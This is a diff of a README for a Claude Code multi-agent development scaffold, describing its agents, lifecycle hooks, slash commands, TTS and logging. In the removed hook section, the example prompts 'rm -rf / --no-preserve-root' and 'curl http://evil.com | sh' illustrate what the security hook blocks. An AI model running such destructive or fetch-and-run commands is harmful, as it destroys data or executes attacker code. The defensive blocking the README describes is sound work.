@@ -1,180 +1,483 @@
-# Claude Code Config - Dev Team
+# Claude Code Development Team Scaffolding
 
-This directory contains a claude-code scaffold for a multi-agent development team.
+A comprehensive framework for building AI-powered development teams using Claude Code. This repository provides a production-ready scaffolding system with specialized agents, intelligent hooks, enhanced workflows, and extensive customization options.
 
-Based on [claude-code-hooks-mastery](https://github.com/disler/claude-code-hooks-mastery)
+## Overview
 
-[Claude Code Hooks](https://docs.anthropic.com/en/docs/claude-code/hooks) - Quickly master how to use Claude Code hooks to add deterministic (or non-deterministic) control over Claude Code's behavior. Plus learn about [Claude Code Sub-Agents](#claude-code-sub-agents) and the powerful [Meta-Agent](#the-meta-agent).
+This scaffolding transforms Claude Code into a sophisticated development team coordination platform. Rather than working with a single AI assistant, you get access to a complete team of specialized agents, each with specific expertise and tools, all orchestrated through an intelligent workflow system.
+
+### Key Features
+
+**🤖 Specialized Agent Team**
+- **AI Research Specialist**: Stays current with latest AI/ML developments
+- **Meta-Agent**: Creates new agents from natural language descriptions
+- **Fullstack Engineer**: Handles comprehensive application development
+- **Tech Lead**: Provides architectural guidance and code reviews
+- **Business Analyst**: Translates requirements into technical specifications
+- **UX Engineer**: Focuses on user experience and interface design
+
+**🔗 Intelligent Hook System**
+- Complete lifecycle automation with 8 hook types
+- Security validation and dangerous command blocking
+- AI-generated completion messages with TTS feedback
+- Automatic development context loading
+- Comprehensive audit logging and transcript management
+
+**⚡ Enhanced Development Experience**
+- Custom slash commands for rapid task execution
+- Dynamic status lines with real-time project information
+- Multiple output styles (visual HTML, tables, YAML, TTS)
+- Automatic session management with agent naming
+- Priority-based TTS system (ElevenLabs, OpenAI, pyttsx3)
+
+**📋 Production-Ready Infrastructure**
+- UV single-file scripts for isolated hook logic
+- Comprehensive logging system with JSON structured data
+- MCP server integrations (Firecrawl, ElevenLabs)
+- Git workflow integration with status tracking
+- Session state persistence and recovery
+
+Based on [claude-code-hooks-mastery](https://github.com/disler/claude-code-hooks-mastery) with extensive enhancements for team coordination and production workflows.
+
+## Quick Start
+
+### 1. Copy Scaffolding to Your Project
+```bash
+# Clone or copy this directory to your new project
+cp -r /path/to/agent-workflows/dev /path/to/your-project/.claude-scaffolding
+cd /path/to/your-project
+
+# Copy the .claude configuration
+cp -r .claude-scaffolding/.claude .
+
+# Copy project files
+cp .claude-scaffolding/CLAUDE.md .
+cp .claude-scaffolding/README.md ./README-scaffolding.md
+```
+
+### 2. Install Claude Code
+```bash
+# Install Claude Code CLI
+curl -fsSL https://claude.ai/install.sh | sh
+
+# Initialize in your project
+claude-code init
+```
+
+### 3. Test the System
+```bash
+# Start Claude Code to activate hooks
+claude-code
+
+# Try a simple command to see hooks in action
+"What files are in this directory?"
+
+# Check that hooks are working
+ls logs/  # Should show JSON log files
+```
+
+### 4. Explore Agent Capabilities
+```bash
+# Research latest AI developments
+"Research the latest developments in LLMs and AI agents"
+
+# Create a new specialized agent
+"Create a new agent that specializes in API testing"
+
+# Get an audio summary
+"tts"
+```
 
 ## Prerequisites
 
-This requires:
-- **[Astral UV](https://docs.astral.sh/uv/getting-started/installation/)** - Fast Python package installer and resolver
+### Required
 - **[Claude Code](https://docs.anthropic.com/en/docs/claude-code)** - Anthropic's CLI for Claude AI
+- **[Astral UV](https://docs.astral.sh/uv/getting-started/installation/)** - Fast Python package installer and resolver
+- **[Git](https://git-scm.com/)** - Version control system
 
-Optional:
-- **[ElevenLabs](https://elevenlabs.io/)** - Text-to-speech provider (with MCP server integration)
-- **[ElevenLabs MCP Server](https://github.com/elevenlabs/elevenlabs-mcp)** - MCP server for ElevenLabs
-- **[Firecrawl MCP Server](https://www.firecrawl.dev/mcp)** - Web scraping and crawling MCP server (my favorite scraper)
-- **[OpenAI](https://openai.com/)** - Language model provider + Text-to-speech provider
-- **[Anthropic](https://www.anthropic.com/)** - Language model provider
-- **[Ollama](https://ollama.com/)** - Local language model provider
+### Optional Integrations
+- **[ElevenLabs](https://elevenlabs.io/)** - Premium text-to-speech (requires API key)
+- **[OpenAI](https://openai.com/)** - GPT models and TTS fallback (requires API key)
+- **[Ollama](https://ollama.com/)** - Local LLM for agent naming and completion messages
+- **[GitHub CLI](https://cli.github.com/)** - Enhanced git workflow integration
 
-### Optional: Ollama Setup
+### MCP Servers (Optional)
+- **[ElevenLabs MCP Server](https://github.com/elevenlabs/elevenlabs-mcp)** - Advanced audio features
+- **[Firecrawl MCP Server](https://www.firecrawl.dev/mcp)** - Web scraping for research agents
+- **Custom MCP servers** - Extend functionality as needed
 
-If using Ollama for local LLM completion messages:
+## Project Structure
+
+```
+project-root/
+├── .claude/                    # Claude Code configuration
+│   ├── agents/                 # Specialized sub-agents
+│   ├── commands/               # Custom slash commands
+│   ├── hooks/                  # Lifecycle automation scripts
+│   ├── output-styles/          # Response formatting options
+│   ├── status_lines/           # Dynamic terminal status displays
+│   ├── data/sessions/          # Session state persistence
+│   └── settings.json           # Main configuration
+├── apps/                       # Your project applications
+├── ai_docs/                    # AI-curated documentation
+│   ├── cc/                     # Claude Code references
+│   ├── bun/                    # Bun runtime documentation  
+│   └── uv/                     # UV Python documentation
+├── logs/                       # Structured event logs
+└── CLAUDE.md                   # Project-specific instructions
+```
+
+### Directory Overview
+
+**[`.claude/`](.claude/README.md)** - Core scaffolding infrastructure
+- **[`agents/`](.claude/agents/)** - Team of specialized AI agents
+- **[`hooks/`](.claude/hooks/README.md)** - Lifecycle automation and workflow enhancement
+- **[`commands/`](.claude/commands/)** - Custom slash commands for rapid task execution
+- **[`output-styles/`](.claude/output-styles/)** - Response formatting configurations
+- **[`status_lines/`](.claude/status_lines/)** - Real-time session information displays
+
+**[`apps/`](apps/README.md)** - Your actual project applications and services
+
+**[`ai_docs/`](ai_docs/README.md)** - Curated documentation for agent reference
+
+**[`logs/`](logs/README.md)** - Comprehensive audit trail and session management
+
+## Development Team Agents
+
+The scaffolding includes a comprehensive team of specialized agents, each designed for specific development tasks:
+
+### Core Development Team
+
+**AI Research (`ai-research`)**
+- Proactively gathers latest developments in AI/ML and engineering
+- Searches across multiple sources for actionable insights
+- Provides structured reports with practical recommendations
+- Tools: WebSearch, WebFetch, Firecrawl integration
+
+**Meta-Agent (`meta-agent`)**
+- Creates new specialized agents from natural language descriptions
+- Ensures consistent agent structure and best practices
+- Automatically determines minimal required tools
+- Essential for scaling your agent capabilities
+
+**Fullstack Engineer (`fullstack-eng`)**
+- Handles end-to-end application development
+- Frontend and backend integration expertise
+- Database design and API development
+- Testing and deployment workflows
+
+**Tech Lead (`tech-lead`)**
+- Provides architectural guidance and technical direction
+- Code review and quality assurance
+- Performance optimization and scaling decisions
+- Team coordination and technical mentoring
+
+**Business Analyst (`business-analyst`)**
+- Translates business requirements into technical specifications
+- Creates user stories and acceptance criteria
+- Stakeholder communication and requirement gathering
+- Project planning and scope management
+
+**UX Engineer (`ux-eng`)**
+- User experience design and interface development
+- Accessibility and usability optimization
+- Design system implementation
+- User research and testing coordination
+
+### Utility Agents
+
+**Work Completion Summary (`work-completion-summary`)**
+- Generates audio summaries of completed work
+- Triggered by "tts" command or task completion
+- Provides next steps and status updates
+
+**README Maintainer (`readme-maintainer`)**
+- Specialized in creating and updating documentation
+- Analyzes code to ensure documentation accuracy
+- Maintains consistent documentation standards
+
+**Git Commit (`git-commit`)**
+- Generates semantic commit messages
+- Analyzes git diff and suggests appropriate message structure
+- Ensures consistent commit history
+
+## Intelligent Hook System
+
+The scaffolding implements all 8 Claude Code hook types with enhanced functionality:
+
+### Hook Lifecycle Events
+
+**1. SessionStart Hook**
+- **Triggers**: New session, resume, or clear
+- **Enhanced Features**: Development context loading, git status integration, TTS session announcements
+- **Data Loaded**: Project files, GitHub issues, recent commits, session state
+
+**2. UserPromptSubmit Hook**
+- **Triggers**: User submits prompt (before Claude processes it)
+- **Enhanced Features**: Prompt validation, security filtering, agent naming, session tracking
+- **Capabilities**: Block dangerous prompts, inject context, generate unique agent names
+
+**3. PreToolUse Hook**
+- **Triggers**: Before any tool execution
+- **Enhanced Features**: Security validation, dangerous command blocking
+- **Protection**: Blocks `rm -rf`, `.env` access, suspicious operations
+
+**4. PostToolUse Hook**
+- **Triggers**: After successful tool completion
+- **Enhanced Features**: Result logging, transcript conversion, execution tracking
+- **Data**: Complete audit trail of all tool usage and results
+
+**5. Notification Hook**
+- **Triggers**: Claude Code notifications (waiting for input, etc.)
+- **Enhanced Features**: TTS alerts with personalization
+- **Smart Features**: "Your agent needs your input" with engineer name inclusion
+
+**6. Stop Hook**
+- **Triggers**: Claude Code finishes responding
+- **Enhanced Features**: AI-generated completion messages, TTS playback, transcript archival
+- **Intelligence**: LLM priority (OpenAI > Anthropic > Ollama), personalized messages
+
+**7. SubagentStop Hook**
+- **Triggers**: Subagents complete their tasks
+- **Enhanced Features**: Multi-agent workflow tracking, completion announcements
+- **Coordination**: Supports complex orchestrated development workflows
+
+**8. PreCompact Hook**
+- **Triggers**: Before conversation history compaction
+- **Enhanced Features**: Automatic transcript backup, compaction logging
+- **Safety**: Preserves conversation history before context compression
+
+### Hook Capabilities
+
+**Security & Validation**
+- Dangerous command detection and blocking
+- Environment file protection
+- Prompt validation and filtering
+- Comprehensive audit logging
+
+**Development Context**
+- Automatic git status loading
+- Project file integration
+- GitHub issues synchronization
+- Session state management
+
+**Audio Feedback System**
+- Priority-based TTS: ElevenLabs → OpenAI → pyttsx3
+- Personalized completion messages
+- Smart notification system
+- Work completion summaries
+
+
+## Custom Commands & Features
+
+### Slash Commands
+
+The scaffolding includes custom slash commands for rapid development:
+
+**Team Management**
+- `/team-build` - Spawn multiple agents for parallel development
+- `/generate-agent` - Create new specialized agents
+- `/quick-research` - Rapid AI research with structured output
+
+**Project Workflow**
+- `/init-project` - Initialize new project structure
+- `/auto-context` - Load project context automatically
+- `/parallel-build` - Coordinate multiple agents for feature development
+
+**Git Integration**
+- `/git-commit` - Generate semantic commit messages
+- `/git-status` - Enhanced git status with agent insights
+
+**Architecture & Testing**
+- `/design` - Architectural design sessions
+- `/review` - Code review with specialized agents
+- `/fix` - Automated debugging and error resolution
+
+### Output Styles
+
+Customize how Claude responds with specialized output formats:
+
+**Visual & Interactive**
+- `genui` - Beautiful HTML with embedded styling for rich visualizations
+- `html-structured` - Semantic HTML5 with data attributes
+
+**Structured Data**
+- `table-based` - Organized markdown tables for comparisons
+- `yaml-structured` - YAML configuration format
+- `bullet-points` - Clean nested lists for action items
+
+**Development Focused**
+- `ultra-concise` - Minimal words, maximum speed for experienced developers
+- `markdown-focused` - Rich markdown with all features
+- `tts-summary` - Audio feedback via TTS for accessibility
+
+### Dynamic Status Lines
+
+Real-time terminal information with multiple versions:
+
+- **v1**: Basic git branch, directory, model info
+- **v2**: Smart prompts with color-coded task types
+- **v3**: Agent sessions with conversation history
+- **v4**: Extended metadata with custom key-value pairs
+
+**Features**:
+- Agent naming with unique identifiers
+- Session persistence across interactions  
+- Color-coded task type indicators
+- Custom metadata management via `/update_status_line`
+
+## Environment Configuration
+
+### Required Environment Variables
+```bash
+# Set your engineer name for personalized features
+export ENGINEER_NAME="Your Name"
+```
+
+### Optional API Keys
+```bash
+# Premium TTS (highest quality)
+export ELEVENLABS_API_KEY="your_elevenlabs_key"
+
+# OpenAI for TTS fallback and LLM features
+export OPENAI_API_KEY="your_openai_key"
+
+# Anthropic for LLM features
+export ANTHROPIC_API_KEY="your_anthropic_key"
+```
+
+### Ollama Setup (Optional Local LLM)
 ```bash
 # Install Ollama from https://ollama.com/download
-# Pull the GPT-OSS model (13GB)
-ollama pull gpt-oss:20b
+# Pull a model for agent naming and completion messages
+ollama pull llama3.2:3b  # Lightweight option
+ollama pull gpt-oss:20b  # More capable option (13GB)
+
 # Start Ollama server
 ollama serve
 ```
 
-The stop hook will use Ollama as fallback after OpenAI/Anthropic for generating completion messages.
+## Architecture & Design
 
-## Hook Lifecycle & Payloads
-
-This demo captures all 8 Claude Code hook lifecycle events with their JSON payloads:
-
-### 1. UserPromptSubmit Hook
-**Fires:** Immediately when user submits a prompt (before Claude processes it)
-**Payload:** `prompt` text, `session_id`, timestamp
-**Enhanced:** Prompt validation, logging, context injection, security filtering
-
-### 2. PreToolUse Hook
-**Fires:** Before any tool execution
-**Payload:** `tool_name`, `tool_input` parameters
-**Enhanced:** Blocks dangerous commands (`rm -rf`, `.env` access)
-
-### 3. PostToolUse Hook
-**Fires:** After successful tool completion
-**Payload:** `tool_name`, `tool_input`, `tool_response` with results
-
-### 4. Notification Hook
-**Fires:** When Claude Code sends notifications (waiting for input, etc.)
-**Payload:** `message` content
-**Enhanced:** TTS alerts - "Your agent needs your input" (30% chance includes name)
-
-### 5. Stop Hook
-**Fires:** When Claude Code finishes responding
-**Payload:** `stop_hook_active` boolean flag
-**Enhanced:** AI-generated completion messages with TTS playback (LLM priority: OpenAI > Anthropic > Ollama > random)
-
-### 6. SubagentStop Hook
-**Fires:** When Claude Code subagents (Task tools) finish responding
-**Payload:** `stop_hook_active` boolean flag
-**Enhanced:** TTS playback - "Subagent Complete"
-
-### 7. PreCompact Hook
-**Fires:** Before Claude Code performs a compaction operation
-**Payload:** `trigger` ("manual" or "auto"), `custom_instructions` (for manual), session info
-**Enhanced:** Transcript backup, verbose feedback for manual compaction
-
-### 8. SessionStart Hook
-**Fires:** When Claude Code starts a new session or resumes an existing one
-**Payload:** `source` ("startup", "resume", or "clear"), session info
-**Enhanced:** Development context loading (git status, recent issues, context files)
-
-
-## What This Shows
-
-- **Complete hook lifecycle coverage** - All 8 hook events implemented and logging
-- **Prompt-level control** - UserPromptSubmit validates and enhances prompts before Claude sees them
-- **Intelligent TTS system** - AI-generated audio feedback with voice priority (ElevenLabs > OpenAI > pyttsx3)
-- **Security enhancements** - Blocks dangerous commands and sensitive file access at multiple levels
-- **Personalized experience** - Uses engineer name from environment variables
-- **Automatic logging** - All hook events are logged as JSON to `logs/` directory
-- **Chat transcript extraction** - PostToolUse hook converts JSONL transcripts to readable JSON format
-
-> **Warning:** The `chat.json` file contains only the most recent Claude Code conversation. It does not preserve conversations from previous sessions - each new conversation is fully copied and overwrites the previous one. This is unlike the other logs which are appended to from every claude code session.
-
-## UV Single-File Scripts Architecture
-
-This project leverages **[UV single-file scripts](https://docs.astral.sh/uv/guides/scripts/)** to keep hook logic cleanly separated from your main codebase. All hooks live in `.claude/hooks/` as standalone Python scripts with embedded dependency declarations.
+### UV Single-File Scripts
+All hooks use **[UV single-file scripts](https://docs.astral.sh/uv/guides/scripts/)** for clean separation:
 
 **Benefits:**
-- **Isolation** - Hook logic stays separate from your project dependencies
-- **Portability** - Each hook script declares its own dependencies inline
-- **No Virtual Environment Management** - UV handles dependencies automatically
-- **Fast Execution** - UV's dependency resolution is lightning-fast
-- **Self-Contained** - Each hook can be understood and modified independently
+- **Isolation**: Hook logic separate from project dependencies
+- **Portability**: Each script declares dependencies inline
+- **No Environment Management**: UV handles everything automatically
+- **Fast Execution**: Lightning-fast dependency resolution
+- **Self-Contained**: Each hook can be understood independently
 
-This approach ensures your hooks remain functional across different environments without polluting your main project's dependency tree.
+### Multi-Agent Orchestration
+The scaffolding supports sophisticated team coordination:
 
-## Key Files
+**Agent Communication**
+- Task delegation between agents
+- State sharing and coordination
+- Parallel execution workflows
+- Result aggregation and reporting
 
-- `.claude/settings.json` - Hook configuration with permissions
-- `.claude/hooks/` - Python scripts using uv for each hook type
-  - `user_prompt_submit.py` - Prompt validation, logging, and context injection
-  - `pre_tool_use.py` - Security blocking and logging
-  - `post_tool_use.py` - Logging and transcript conversion
-  - `notification.py` - Logging with optional TTS (--notify flag)
-  - `stop.py` - AI-generated completion messages with TTS
-  - `subagent_stop.py` - Simple "Subagent Complete" TTS
-  - `pre_compact.py` - Transcript backup and compaction logging
-  - `session_start.py` - Development context loading and session logging
-  - `utils/` - Intelligent TTS and LLM utility scripts
-    - `tts/` - Text-to-speech providers (ElevenLabs, OpenAI, pyttsx3)
-    - `llm/` - Language model integrations (OpenAI, Anthropic, Ollama)
-- `.claude/status_lines/` - Real-time terminal status displays
-  - `status_line.py` - Basic MVP with git info
-  - `status_line_v2.py` - Smart prompts with color coding
-  - `status_line_v3.py` - Agent sessions with history
-  - `status_line_v4.py` - Extended metadata support
-- `.claude/output-styles/` - Response formatting configurations
-  - `genui.md` - Generates beautiful HTML with embedded styling
-  - `table-based.md` - Organizes information in markdown tables
-  - `yaml-structured.md` - YAML configuration format
-  - `bullet-points.md` - Clean nested lists
-  - `ultra-concise.md` - Minimal words, maximum speed
-  - `html-structured.md` - Semantic HTML5
-  - `markdown-focused.md` - Rich markdown features
-  - `tts-summary.md` - Audio feedback via TTS
-- `.claude/commands/` - Custom slash commands
-  - `prime.md` - Project analysis and understanding
-  - `cook.md` - Development-focused parallel agent tasks
-  - `cook_research_only.md` - Research-focused parallel tasks
-  - `update_status_line.md` - Dynamic status updates
-- `.claude/agents/` - Sub-agent configurations
-  - Core development team agents
-  - `hello-world-agent.md` - Simple greeting example
-  - `llm-ai-agents-and-eng-research.md` - AI research specialist
-  - `meta-agent.md` - Agent that creates other agents
-  - `work-completion-summary.md` - Audio summary generator
-- `logs/` - JSON logs of all hook executions
-  - `user_prompt_submit.json` - User prompt submissions with validation
-  - `pre_tool_use.json` - Tool use events with security blocking
-  - `post_tool_use.json` - Tool completion events
-  - `notification.json` - Notification events
-  - `stop.json` - Stop events with completion messages
-  - `subagent_stop.json` - Subagent completion events
-  - `pre_compact.json` - Pre-compaction events with trigger type
-  - `session_start.json` - Session start events with source type
-  - `chat.json` - Readable conversation transcript (generated by --chat flag)
-- `ai_docs/` - Documentation resources
-  - `cc_hooks_docs.md` - Complete hooks documentation from Anthropic
-  - `user_prompt_submit_hook.md` - Comprehensive UserPromptSubmit hook documentation
-  - `uv-single-file-scripts.md` - UV script architecture documentation
-  - `anthropic_custom_slash_commands.md` - Slash commands documentation
-  - `anthropic_docs_subagents.md` - Sub-agents documentation
+**Session Management**
+- Persistent agent identities
+- Context preservation across interactions
+- Session state recovery
+- Conversation history management
 
-Hooks provide deterministic control over Claude Code behavior without relying on LLM decisions.
+**Quality Assurance**
+- Comprehensive audit logging
+- Security validation at multiple levels
+- Graceful error handling
+- Development context integration
 
-## Features Demonstrated
+## Usage Examples
 
-- Prompt validation and security filtering
-- Context injection for enhanced AI responses
-- Command logging and auditing
-- Automatic transcript conversion
-- Permission-based tool access control
-- Error handling in hook execution
+### Basic Development Workflow
+```bash
+# Start Claude Code (activates hooks and loads context)
+claude-code
 
-Run any Claude Code command to see hooks in action via the `logs/` files.
+# Get latest AI research
+"Research the latest developments in AI agents and LLMs"
 
-## Hook Error Codes & Flow Control
+# Create a specialized agent
+"Create a new agent that specializes in React testing"
 
-Claude Code hooks provide powerful mechanisms to control execution flow and provide feedback through exit codes and structured JSON output.
+# Use multiple agents for parallel development
+"Coordinate fullstack-eng and ux-eng agents to build a user dashboard"
+
+# Get audio summary of work
+"tts"
+```
+
+### Advanced Team Coordination
+```bash
+# Initialize a new project with full team setup
+/init-project
+
+# Parallel development with multiple agents
+/team-build "Build a REST API with authentication and frontend"
+
+# Architectural review session
+/design "Design a microservices architecture for e-commerce"
+
+# Automated testing and fixes
+/review && /fix
+```
+
+### Research and Documentation
+```bash
+# Comprehensive AI research
+/quick-research "Latest developments in multimodal AI"
+
+# Generate project documentation
+"Create comprehensive README files for all project directories"
+
+# Code review with specialized agents
+"Have tech-lead review the recent changes and suggest improvements"
+```
+
+## Monitoring & Observability
+
+### Structured Logging
+All events are logged as structured JSON in the `logs/` directory:
+
+```bash
+# View recent user prompts
+cat logs/user_prompt_submit.json | jq '.[-5:]'
+
+# Monitor tool usage
+cat logs/post_tool_use.json | jq '.[] | select(.tool_name == "Task")'
+
+# Track agent completions
+cat logs/subagent_stop.json | jq '.'
+```
+
+### Session Management
+Session state is preserved in `.claude/data/sessions/`:
+
+```json
+{
+  "session_id": "unique-session-id",
+  "agent_name": "Phoenix",
+  "prompts": ["Recent prompts..."],
+  "extras": {
+    "project": "myapp",
+    "status": "development"
+  }
+}
+```
+
+### Real-time Status
+Status lines provide live information:
+- Current agent name and model
+- Recent prompts and task types
+- Git branch and project status
+- Custom metadata and tags
+
+## Hook System Deep Dive
+
+The scaffolding implements sophisticated flow control through hooks:
 
 ### Exit Code Behavior
 
@@ -352,106 +655,81 @@ if not all_tests_passed():
 - **Input**: JSON via stdin with session and tool data
 - **Output**: Processed via stdout/stderr with exit codes
 
-## UserPromptSubmit Hook Deep Dive
+### Flow Control & Security
 
-The UserPromptSubmit hook is the first line of defense and enhancement for Claude Code interactions. It fires immediately when you submit a prompt, before Claude even begins processing it.
+**Prompt-Level Control**
+- Security validation before Claude processes prompts
+- Context injection for enhanced responses
+- Audit logging for compliance
+- Agent naming and session management
 
-### What It Can Do
+**Tool-Level Security** 
+- Dangerous command detection (`rm -rf`, `.env` access)
+- Real-time blocking of suspicious operations
+- Comprehensive tool usage logging
+- Permission-based access control
 
-1. **Log prompts** - Records every prompt with timestamp and session ID
-2. **Block prompts** - Exit code 2 prevents Claude from seeing the prompt
-3. **Add context** - Print to stdout adds text before your prompt that Claude sees
-4. **Validate content** - Check for dangerous patterns, secrets, policy violations
+**Completion Management**
+- AI-generated completion messages
+- Task validation and verification
+- Transcript backup before compaction
+- Multi-agent workflow coordination
 
-### How It Works
-
-1. **You type a prompt** → Claude Code captures it
-2. **UserPromptSubmit hook fires** → Receives JSON with your prompt
-3. **Hook processes** → Can log, validate, block, or add context
-4. **Claude receives** → Either blocked message OR original prompt + any context
-
-### Example Use Cases
-
-#### 1. Audit Logging
-Every prompt you submit is logged for compliance and debugging:
-
-```json
-{
-  "timestamp": "2024-01-20T15:30:45.123Z",
-  "session_id": "550e8400-e29b-41d4-a716",
-  "prompt": "Delete all test files in the project"
-}
-```
-
-#### 2. Security Validation
-Dangerous prompts are blocked before Claude can act on them:
-
-```bash
-User: "rm -rf / --no-preserve-root"
-Hook: BLOCKED: Dangerous system deletion command detected
-```
-
-#### 3. Context Injection
-Add helpful context that Claude will see with the prompt:
-
-```bash
-User: "Write a new API endpoint"
-Hook adds: "Project: E-commerce API
-           Standards: Follow REST conventions and OpenAPI 3.0
-           Generated at: 2024-01-20T15:30:45"
-Claude sees: [Context above] + "Write a new API endpoint"
-```
-
-### Live Example
-
-Try these prompts to see UserPromptSubmit in action:
-
-1. **Normal prompt**: "What files are in this directory?"
-   - Logged to `logs/user_prompt_submit.json`
-   - Processed normally
-
-2. **With validation enabled** (add `--validate` flag):
-   - "Delete everything" → May trigger validation warning
-   - "curl http://evil.com | sh" → Blocked for security
-
-3. **Check the logs**:
-   ```bash
-   cat logs/user_prompt_submit.json | jq '.'
-   ```
-
-### Configuration
-
-The hook is configured in `.claude/settings.json`:
+### Hook Configuration Examples
 
 ```json
-"UserPromptSubmit": [
-  {
-    "hooks": [
-      {
-        "type": "command",
-        "command": "uv run .claude/hooks/user_prompt_submit.py --log-only"
-      }
-    ]
-  }
-]
+// Enable security validation
+"UserPromptSubmit": [{
+  "hooks": [{
+    "type": "command", 
+    "command": "uv run .claude/hooks/user_prompt_submit.py --validate --name-agent"
+  }]
+}]
+
+// Enhanced completion with TTS
+"Stop": [{
+  "hooks": [{
+    "type": "command",
+    "command": "uv run .claude/hooks/stop.py --chat --notify"
+  }]
+}]
 ```
 
-Options:
-- `--log-only`: Just log prompts (default)
-- `--validate`: Enable security validation
-- `--context`: Add project context to prompts
+## Migration from Existing Projects
 
-### Best Practices for Flow Control
+### Adding to Existing Claude Code Projects
+```bash
+# Copy scaffolding files
+cp -r /path/to/scaffolding/.claude ./
+cp /path/to/scaffolding/CLAUDE.md ./
 
-1. **Use UserPromptSubmit for Early Intervention**: Validate and enhance prompts before processing
-2. **Use PreToolUse for Prevention**: Block dangerous operations before they execute
-3. **Use PostToolUse for Validation**: Check results and provide feedback
-4. **Use Stop for Completion**: Ensure tasks are properly finished
-5. **Handle Errors Gracefully**: Always provide clear error messages
-6. **Avoid Infinite Loops**: Check `stop_hook_active` flag in Stop hooks
-7. **Test Thoroughly**: Verify hooks work correctly in safe environments
+# Merge settings if you have existing configuration
+# Review and merge .claude/settings.json
 
-## Claude Code Sub-Agents
+# Install dependencies
+uv --version  # Ensure UV is installed
+
+# Test the system
+claude-code
+"Test the enhanced hooks system"
+```
+
+### Customization
+```bash
+# Add your own agents
+cp .claude/agents/meta-agent.md .claude/agents/my-specialist.md
+# Edit the agent configuration
+
+# Create custom commands
+cp .claude/commands/project/question.md .claude/commands/my-command.md
+
+# Add custom output styles
+echo "Custom style..." > .claude/output-styles/my-style.md
+```
+
+## Advanced Features
+
+### Agent Orchestration
 
 > Watch [this YouTube video](https://youtu.be/7B2HJr0Y68g) to see how to create and use Claude Code sub-agents effectively.
 >
@@ -461,229 +739,236 @@ Options:
 
 Claude Code supports specialized sub-agents that handle specific tasks with custom system prompts, tools, and separate context windows. Sub-agents are AI assistants that your primary Claude Code agent can delegate tasks to.
 
-### Understanding Sub-Agents: System Prompts, Not User Prompts
+Sub-agents enable sophisticated team coordination with automatic delegation:
 
-**Critical Concept**: The content in agent files (`.claude/agents/*.md`) are **system prompts** that configure the sub-agent's behavior. They are NOT user prompts. This is the #1 misunderstanding when creating agents.
-
-**Information Flow**:
+**Information Flow:**
 ```
-You (User) → Primary Agent → Sub-Agent → Primary Agent → You (User)
+You → Primary Claude → Specialized Agent → Primary Claude → You
 ```
 
-<img src="images/SubAgentFlow.gif" alt="Sub-Agent Information Flow" style="max-width: 800px; width: 100%;" />
+**Key Concepts:**
+- Agent files contain **system prompts** that define agent behavior
+- The `description` field tells Claude when to automatically delegate
+- Sub-agents report back to primary agent, not directly to you
+- Each agent starts fresh with specific context and tools
 
-1. **You** make a request to Claude Code (primary agent)
-2. **Primary Agent** analyzes your request and delegates to appropriate sub-agent
-3. **Sub-Agent** executes task using its system prompt instructions
-4. **Sub-Agent** reports results back to primary agent
-5. **Primary Agent** synthesizes and presents results to you
-
-**Key Points**:
-- Sub-agents NEVER communicate directly with you
-- Sub-agents start fresh with no conversation history
-- Sub-agents respond to the primary agent's prompt, not yours
-- The `description` field tells the primary agent WHEN to use the sub-agent
-
-### Agent Storage & Organization
-
-This repository demonstrates various agent configurations:
-
-**Project Agents** (`.claude/agents/`):
-```
-.claude/agents/
-├── Development team agents with specialized expertise
-├── hello-world-agent.md       # Simple greeting agent
-├── llm-ai-agents-and-eng-research.md  # AI research specialist
-├── meta-agent.md              # Agent that creates agents
-└── work-completion-summary.md # Audio summary generator
+**Automatic Delegation:**
+```yaml
+description: "Use proactively when researching AI/ML developments"
+description: "MUST BE USED for creating new agents"
+description: "Specialist for React testing and quality assurance"
 ```
 
-**Storage Hierarchy**:
-- **Project agents**: `.claude/agents/` (higher priority, project-specific)
-- **User agents**: `~/.claude/agents/` (lower priority, available across all projects)
-- **Format**: Markdown files with YAML frontmatter
+### Creating Custom Agents
 
-**Agent File Structure:**
+Use the meta-agent to create new specialized agents:
+
+```bash
+# Create a testing specialist
+"Create a new agent that specializes in automated testing with pytest and Jest"
+
+# Create a deployment expert  
+"Build an agent focused on Docker and Kubernetes deployment"
+
+# Create a security auditor
+"Generate an agent that performs security audits and vulnerability scanning"
+```
+
+**Agent Structure:**
 ```yaml
 ---
-name: agent-name
-description: When to use this agent (critical for automatic delegation)
-tools: Tool1, Tool2, Tool3  # Optional - inherits all tools if omitted
-color: Cyan  # Visual identifier in terminal
-model: opus # Optional - haiku | sonnet | opus - defaults to sonnet
+name: testing-specialist
+description: "Use for automated testing, test coverage, and quality assurance"
+tools: Read, Write, Edit, Bash(pytest:*), Bash(jest:*), Grep
+color: green
+model: sonnet
 ---
 
 # Purpose
-You are a [role definition].
+You are a testing specialist focused on automated testing and quality assurance.
 
-## Instructions
-1. Step-by-step instructions
-2. What the agent should do
-3. How to report results
-
-## Report/Response Format
-Specify how the agent should communicate results back to the primary agent.
+## Workflow
+1. **Analyze Test Requirements**
+2. **Create Test Plans** 
+3. **Implement Tests**
+4. **Generate Reports**
 ```
 
-Sub-agents enable:
-- **Task specialization** - Code reviewers, debuggers, test runners
-- **Context preservation** - Each agent operates independently
-- **Tool restrictions** - Grant only necessary permissions
-- **Automatic delegation** - Claude proactively uses the right agent
+### Agent Best Practices
 
-### Key Engineering Insights
+**Critical Success Factors:**
+1. **Clear Descriptions**: Use trigger phrases like "Use proactively when..." or "MUST BE USED for..."
+2. **Minimal Tools**: Only include necessary tools to avoid permission complexity
+3. **Structured Workflows**: Define clear step-by-step processes
+4. **Output Formats**: Specify exactly how agents should report results
 
-**Two Critical Mistakes to Avoid:**
+**Common Patterns:**
+- **Research Agents**: WebSearch, WebFetch, Write for documentation
+- **Code Agents**: Read, Edit, Bash commands for specific tools
+- **Testing Agents**: Bash testing tools, Read, Write for reports
+- **Deployment Agents**: Docker/K8s Bash commands, Read configs
 
-1. **Misunderstanding the System Prompt** - What you write in agent files is the *system prompt*, not a user prompt. This changes how you structure instructions and what information is available to the agent.
+### Complex Workflow Examples
 
-2. **Ignoring Information Flow** - Sub-agents respond to your primary agent, not to you. Your primary agent prompts sub-agents based on your original request, and sub-agents report back to the primary agent, which then reports to you.
-
-**Best Practices:**
-- Use the `description` field to tell your primary agent *when* and *how* to prompt sub-agents
-- Include phrases like "use PROACTIVELY" or trigger words (e.g., "if they say TTS") in descriptions
-- Remember sub-agents start fresh with no context - be explicit about what they need to know
-- Follow Problem → Solution → Technology approach when building agents
-
-### Complex Workflows & Agent Chaining
-
-Claude Code can intelligently chain multiple sub-agents together for complex tasks:
-
-<img src="images/SubAgentChain.gif" alt="Sub-Agent Chaining" style="max-width: 800px; width: 100%;" />
-
-For example:
-- "First research the latest frameworks with llm-ai-agents-and-eng-research, then create specialized agents with meta-agent"
